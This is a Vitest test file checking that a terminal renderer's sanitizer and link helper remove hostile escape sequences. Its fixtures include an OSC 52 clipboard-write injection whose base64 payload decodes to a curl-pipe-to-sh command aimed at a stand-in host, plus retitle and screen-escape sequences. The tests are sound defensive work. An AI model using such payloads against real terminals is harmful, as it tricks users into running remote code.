import { describe, expect, it } from 'vitest'

import { LogUpdate } from '../log-update.js'
import Output from '../output.js'
import { CharPool, createScreen, HyperlinkPool, StylePool } from '../screen.js'

import { link } from './osc.js'
import { sanitizeTerminalText } from './sanitize.js'

const ESC = '\x1b'
const BEL = '\x07'
const ST = `${ESC}\\`

const CLIPBOARD = `${ESC}]52;c;Y3VybCAtcyBodHRwOi8vZXZpbC5leGFtcGxlL3ggfCBzaA==${ST}`

/* What `cat README.md` of a hostile file hands back: ordinary text, with a
   clipboard write hidden inside an OSC 8 URI, a retitle and an exit from the
   alternate screen. */
const HOSTILE = [
  `Install with ${ESC}]8;;http://x${ST}${CLIPBOARD}${BEL}install${ESC}]8;;${BEL} and run it`,
  `${ESC}]0;PWNED${BEL}title`,
  `${ESC}[?1049l leaves alt screen 12345`,
  `${ESC}[?1000l mouse off`,
  `${ESC}[2K\rDownloading 45%`,
  `\u009b31m C1 CSI`
]

describe('sanitizeTerminalText', () => {
  it('leaves plain text, SGR and a printable OSC 8 link alone', () => {
    const text = `${ESC}[1;31mred${ESC}[0m and ${ESC}]8;id=a;https://example.com/a?b=c${BEL}link${ESC}]8;;${BEL}`

    expect(sanitizeTerminalText('plain text, кириллица, 中文')).toBe('plain text, кириллица, 中文')
    expect(sanitizeTerminalText(text)).toBe(text)
  })

  it.each(HOSTILE)('drops every other sequence from %j', input => {
    const out = sanitizeTerminalText(input)

    expect(out).not.toContain(`${ESC}]52`)
    expect(out).not.toContain(`${ESC}]0;`)
    expect(out).not.toContain(`${ESC}[?`)
    expect(out).not.toContain(`${ESC}[2K`)
    expect(out).not.toContain('\u009b')
  })

  it('keeps the readable words around what it drops', () => {
    expect(sanitizeTerminalText(`${ESC}]0;PWNED${BEL}title`)).toBe('title')
    expect(sanitizeTerminalText(`${ESC}[?1049l leaves`)).toBe(' leaves')
  })

  it('drops an unterminated string sequence to the end of the text', () => {
    expect(sanitizeTerminalText(`before${ESC}]52;c;abc`)).toBe('before')
  })
})

describe('link', () => {
  it('writes no OSC 8 for a URI or parameter carrying a control character', () => {
    expect(link(`http://x${ST}${CLIPBOARD}`)).toBe('')
    expect(link('http://x', { id: `a${BEL}` })).toBe('')
    expect(link('https://example.com')).toContain('https://example.com')
  })
})

describe('rendered text reaches the terminal without foreign sequences', () => {
  it.each(HOSTILE)('%j', input => {
    const stylePool = new StylePool()
    const charPool = new CharPool()
    const hyperlinkPool = new HyperlinkPool()
    const w = 80
    const h = 2
    const prev = createScreen(w, h, stylePool, charPool, hyperlinkPool)
    const next = createScreen(w, h, stylePool, charPool, hyperlinkPool)
    const output = new Output({ width: w, height: h, stylePool, screen: next })

    output.write(0, 0, input)
    const screen = output.get()

    screen.damage = { x: 0, y: 0, width: w, height: h }

    const frame = (s: typeof screen) => ({
      screen: s,
      viewport: { width: w, height: h },
      cursor: { x: 0, y: 0, visible: true }
    })

    const diff = new LogUpdate({ isTTY: true, stylePool }).render(frame(prev), frame(screen), true, false)

    // Each patch as terminal.ts writes it; a hyperlink patch goes out as link(uri).
    const written = diff
      .map(p =>
        p.type === 'stdout' ? p.content : p.type === 'styleStr' ? p.str : p.type === 'hyperlink' ? link(p.uri) : ''
      )
      .join('')

    expect(written).not.toContain(`${ESC}]52`)
    expect(written).not.toContain(`${ESC}]0;`)
    expect(written).not.toContain(`${ESC}[?1049l`)
    expect(written).not.toContain(`${ESC}[?1000l`)
    expect(written).not.toContain(`${ESC}[2K`)
  })
})
